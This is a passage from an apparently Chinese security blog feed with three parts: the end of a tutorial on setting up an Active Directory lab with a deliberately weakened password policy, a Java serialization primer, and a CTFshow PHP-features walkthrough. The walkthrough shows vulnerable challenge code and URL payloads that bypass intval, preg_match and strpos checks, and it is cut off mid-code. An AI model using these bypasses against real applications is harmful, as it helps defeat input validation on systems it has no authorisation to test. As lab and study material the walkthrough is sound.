Directory</p><p><strong>NTDS.dit：</strong>域用账户以数据库形式保存在活动目录中</p><p>Ntdsutil.exe-ntdsutil.exe是域控制器自带的域数据库管理工具，从windows Server 2008 开始默认自带。我们可以通过ntdsutil.exe提取出域中所有的域用户信息</p><p><strong>常规结构：</strong>组织单元(OU)、域(DOMAIN)、域树(tree)、域森林(forest),在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每个域只储存该域内的数据</p><p><strong>活动目录：</strong></p><p>账号集中管理：所有账号均存在服务器上，方便对账号的重命名&#x2F;重置密码。</p><p>软件集中管理：统一推送软件，统一安装网络打印机等。利用软件分布策略分发软件，可以让用户自由选择安装软件。</p><p>环境集中管理：利用AD可以统一客户端桌面，IE，TCP&#x2F;IP等设置。</p><p>增强安全性：统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</p><p>更可靠：更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定。</p><p>活动目录为Microsoft统一管理的基础平台，其他ISA、Exchange、SMS等服务都依赖于这个基础平台</p><h3 id="搭建域："><a href="#搭建域：" class="headerlink" title="搭建域："></a><strong>搭建域：</strong></h3><h4 id="搭建域控："><a href="#搭建域控：" class="headerlink" title="搭建域控："></a>搭建域控：</h4><p>这里用win2008R2和win10的系统（一定是2008R2，或者是2012R2也行）</p><p>网络选择桥接</p><p>在虚拟机中下载VMware Tools</p><p>win2008R2如果安装失败可以参考<a href="https://blog.csdn.net/2301_77225571/article/details/139115200">Windows Server 2008 R2安装VMtools-安装失败的解决方法</a></p><p>在win2008R2中进行配置域环境</p><p><img src="/images/neiwang/2.png"></p><p><strong>添加角色</strong>：</p><p>服务器角色选择Active Directory 域服务</p><p>一路下一步直到安装</p><p>打开服务器管理器</p><p><img src="/images/neiwang/3.png"></p><p>在角色下有一个× Active Directory 域服务(此图是我已经完成的图片)</p><p>选择在新林中新建域</p><p>起一个域名(我是：piiicksec.fbi)</p><p>点击下一步</p><p>林功能级别选择Windows Server 2008 R2</p><p>下一步，有选是否就选是，设置密码。</p><p><strong>打开组策略管理</strong>：</p><p><img src="/images/neiwang/5.png"></p><p>右键编辑Default Dmain Policy</p><p><img src="/images/neiwang/6.png"></p><p>策略-&gt;Windows设置-&gt;安全设置</p><p><img src="/images/neiwang/7.png"></p><p>账户策略-&gt;密码</p><p><img src="/images/neiwang/8.png"></p><p>选择禁用密码必须符合复杂性要求</p><p>密码长度最小为6</p><p>密码最长使用期限设为0（不用修改密码）</p><p><img src="/images/neiwang/9.png"></p><p>重启win2008，使得刚刚修改的策略生效</p><p><strong>打开AD用户与计算机</strong>：</p><p><img src="/images/neiwang/10.png"></p><p>打开USERS目录，右键用户</p><p><img src="/images/neiwang/11.png"></p><p>用户名设定为test</p><p><img src="/images/neiwang/12.png"></p><p>密码设定为123456</p><p>设定为不能更改密码且密码永不过期</p><p><img src="/images/neiwang/13.png"></p><p>完成新用户的创建</p><p><img src="/images/neiwang/14.png"></p><h4 id="计算机加入域控："><a href="#计算机加入域控：" class="headerlink" title="计算机加入域控："></a>计算机加入域控：</h4><p>设置win10的dns，通过dns查找域</p><p>控制面板 -&gt;网络和Internet -&gt;网络和共享中心</p><p>点击右侧的 连接：Ethernet0</p><p><img src="/images/neiwang/15.png"></p><p>点击左下角属性打开</p><p><img src="/images/neiwang/16.png"></p><p>打开协议版本4（TCP&#x2F;IPv4）</p><p>此时回到<strong>win2008</strong>，在cmd窗口输入ipconfig</p><p><img src="/images/neiwang/17.png"></p><p>得到IPv4地址，回到win10之前的窗口，使用下面的DNS地址，输入我们的IPv4地址</p><p><img src="/images/neiwang/18.png"></p><p>设置dns成功</p><p><strong>加入域</strong>：</p><p>控制面板-&gt;系统和安全-&gt;系统</p><p><img src="/images/neiwang/19.png"></p><p>选择左侧的高级系统设置</p><p><img src="/images/neiwang/20.png"></p><p>点击更改</p><p>计算机名改为<strong>win10</strong></p><p>选择<strong>隶属于域</strong>，域名为win2008设置的</p><p><img src="/images/neiwang/21.png"></p><p>这里需要填入加入改域的名称和密码</p><p>为test和123456（就是前面设置的用户）</p><p><img src="/images/neiwang/22.png"></p><p><strong>重启</strong>win10虚拟机让更改生效</p><p><strong>登录win10时</strong>选择其他用户</p><p><img src="/images/neiwang/23.png"></p><p>输入我们域用户test和密码</p><p><img src="/images/neiwang/24.png"></p><p>等待创建用户信息</p><p>win+r打开cmd输入whoami查看当前用户</p><p><img src="/images/neiwang/25.png"></p><p>域环境就搭好了（虽然没有备份域但是已经够用了）</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化基础</title>
    <link href="/2024/07/04/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/07/04/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="JAVA原生序列化与反序列化"><a href="#JAVA原生序列化与反序列化" class="headerlink" title="JAVA原生序列化与反序列化"></a>JAVA原生序列化与反序列化</h2><p><strong>序列化与反序列化：</strong></p><p>JAVA序列化是指把java对象转换为字节序列的过程，而java反序列化是指把字节序列恢复为java对象的过程。</p><p>序列化分为两大部分：序列化和反序列化。序列化是这个过程的第一个部分，将数据分解成字节流，以便储存在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据有恢复数据的对象实例。</p><p><strong>为什么要序列化与反序列化：</strong></p><p>我们知道，当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等，而这些数据都会以二进制序列的形式在网络上传送。当两个java进程进行通信时，实现进程间的对象传送需要java序列化与反序列化。一方面，发送方需要把这个java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出java对象。</p><p>通过序列化可以把数据永久地保存在硬盘上，利用序列化还能实现远程通信。</p><p><strong>几种常见的序列化和反序列化协议</strong>：</p><p><strong>XML&amp;SOAP</strong>：XML是一种常用的序列化和反序列化协议，具有跨机器，跨语言的优点，SOAP(Simple Object Access Protocol)是一种被广泛应用的，基于XML为序列化和反序列化协议的结构化消息传递协议</p><p><strong>JSON(Javascript Object Notation)</strong></p><p><strong>Protobuf</strong></p><p><strong>序列化的实现</strong>：</p><p>只有实现了Serializeble或者Externalizable接口的类的对象才能被序列化为字节序列。(不是则会抛出异常)</p><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<span class="hljs-comment">//实现Serializable接口</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span>+<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span>+<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//一个实现serializeble接口的子类也是可以被序列化的。</span><br><span class="hljs-comment">//静态成员变量是不能序列化的:序列化是针对对象属性的，而静态成员变量是属于类的。</span><br><span class="hljs-comment">//transient标识的成员变量不参与序列化</span><br></code></pre></td></tr></table></figure><p>SerializeTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">serializeTest</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);<br>        System.out.println(person);<br>        serialize(person);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ObjectOutputStream代表对象输出流：</span><br><span class="hljs-comment">//它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节写到一个目标输出流中</span><br></code></pre></td></tr></table></figure><p>UnserializeTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String fileName)</span> <span class="hljs-keyword">throws</span> IOException,ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(fileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ObjectInputStream代表对象输入流：</span><br><span class="hljs-comment">//它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow--php特性</title>
    <link href="/2024/05/30/ctfshow%20--%20php%E7%89%B9%E6%80%A7/"/>
    <url>/2024/05/30/ctfshow%20--%20php%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="CTFSHOW-PHP特性篇"><a href="#CTFSHOW-PHP特性篇" class="headerlink" title="CTFSHOW-PHP特性篇"></a>CTFSHOW-PHP特性篇</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">intval(mixed $value, int $base = 10): int<br>通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_WARNING 错误并返回 1。<br>本题if(preg_match(&quot;/[0-9]/&quot;, $num))会检查传入的num参数，会匹配存在0~9的参数，如果存在就会结束。 <br>intval函数是 PHP 中用于将变量转换为整数类型的函数。它的基本作用是将输入的值按照特定的规则转换为一个整数值。<br>    如果不存在数字则会返回1，不会输出flag。<br>    但是如果我们输入num为数组，intval会返回1，而不是触发错误，即可绕过此题。<br>    <br>    payload:http://example.com/script.php?num[]=1<br></code></pre></td></tr></table></figure><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">利用intval的特性，intval(4476a)会返回4476<br>intval 从字符串开头开始解析，直到遇到非数字字符。<br>在 4476a中4676是有效的整数，遇到 a 后停止解析并返回 4476<br>   payload:http://example.com/script.php?num=4476a<br></code></pre></td></tr></table></figure><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/im&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonononono&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">为了输出 $flag，我们需要通过第一次正则表达式检查，但不能通过第二次检查。观察到两个正则表达式的唯一区别在于第二个正则表达式没有多行模式 m。<br>绕过方法是利用多行模式的特性<br>如果输入<br>   php<br>   1<br>   则可通过第一次正则，但是不通过第二个正则。<br>   用%0A表示换行符则可写成php%0A1<br>   payload:http://example.com/script.php?cmd=php%0A1<br></code></pre></td></tr></table></figure><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">要绕过检查以成功输出$flag我们需要：<br>确保第一次检查$num == 4476失败。<br>确保intval($num,0) == 4476成立。<br><br>当 intval 函数的第二个参数为 0 时，它会根据字符串前缀自动确定进制：<br>0x 或 0X 前缀表示 16 进制。<br>0 前缀表示 8 进制。<br>无前缀或其他前缀表示 10 进制。<br><br>显然直接传4476是无法成功的，但是通过利用八进制表示，可以传递 num 参数值为 010574；<br>八进制010574就会等于十进制4476<br>payload:http://example.com/script.php?num=010574<br>这里用web90的payload也可以<br></code></pre></td></tr></table></figure><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用web92的payload即可，这里主要是阻止了web90的payload的情况</p><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">strpos(string $haystack, string $needle, int $offset = 0): int|false<br>返回 needle 在 haystack 中首次出现的数字位置。 <br><br>if(!strpos($num, &quot;0&quot;))<br> 如果 $num 不包含字符 &quot;0&quot;或者0在首位置，则输出 &quot;no no no!&quot; 并终止脚本。<br> <br> 那么就要求我们必须要有0，并且不能在第一个位置，那么我们就可以放到最后的位置。<br> 如果传入为?num=4476.0则可以绕过strpos，并且满足前面的条件<br> <br> payload:http://example.com/script.php?num=4476.0<br></code></pre></td></tr></table></figure><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span 